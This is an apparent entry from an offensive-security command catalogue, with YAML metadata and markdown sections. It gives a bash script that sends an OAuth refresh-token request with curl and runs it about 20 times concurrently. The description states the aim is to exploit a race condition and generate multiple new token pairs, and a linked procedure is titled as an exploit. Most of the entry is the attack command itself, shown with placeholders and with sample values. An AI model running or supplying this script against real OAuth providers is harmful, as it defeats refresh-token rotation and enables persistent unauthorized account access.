---
id: cmd-curl-refresh-race-001
data: >-
  #!/bin/bash

  curl --data
  "grant_type=refresh_token&refresh_token=REFRESH_TOKEN_VALUE&client_id=APPLICATION_ID&client_secret=APPLICATION_SECRET"
  "https://OAUTH_PROVIDER_DOMAIN/oauth/token" &

  # Repeat 20 times
tags:
  - oauth
  - refresh-race
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:38.746Z'
verified: false
validated: true
submitted: true
---
# curl-oauth-refresh-race

## Command

```bash
#!/bin/bash
curl --data "grant_type=refresh_token&refresh_token=REFRESH_TOKEN_VALUE&client_id=APPLICATION_ID&client_secret=APPLICATION_SECRET" "https://OAUTH_PROVIDER_DOMAIN/oauth/token" &
# Repeat the curl line 20 times
```

## Description

Bash script for concurrent refresh token exchanges to exploit races and generate multiple new token pairs.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| refresh_token | Token to refresh | Yes |
| client_id | App ID | Yes |
| client_secret | App secret | Yes |
| grant_type | 'refresh_token' | Yes |

## Examples

### Basic Usage

```bash
#!/bin/bash
curl --data "grant_type=refresh_token&refresh_token=def456&client_id=app1&client_secret=secret" "https://provider.com/oauth/token" &
# Repeat 20x
```

## Expected Output

Multiple JSON with new access/refresh tokens.

## Related

- [[commands/curl-oauth-initial-access]]
- [[procedures/Exploit-Refresh-Token-Race-Condition]]
